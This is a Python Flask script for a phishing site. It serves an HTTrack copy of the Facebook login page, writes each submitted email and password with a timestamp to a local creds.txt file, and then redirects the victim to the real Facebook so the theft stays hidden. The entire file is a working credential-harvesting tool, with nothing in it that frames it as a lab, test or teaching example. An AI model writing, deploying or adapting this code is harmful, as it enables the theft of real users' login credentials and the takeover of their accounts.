from flask import Flask, request, send_from_directory, redirect
import os
import datetime

app = Flask(__name__, static_folder='facebook_clone')

# Serve the root index.html (from HTTrack)
@app.route('/')
def index():
    return send_from_directory('facebook_clone', 'index.html')

# Serve the cloned login.html and its resources
@app.route('/www.facebook.com/<path:path>')
def facebook_clone(path):
    return send_from_directory('facebook_clone/www.facebook.com', path)

# Log credentials
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('pass')

    with open('logs/creds.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} | USERNAME: {username} | PASSWORD: {password}\n")

    return redirect("https://facebook.com/login")  # Redirect to real FB

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

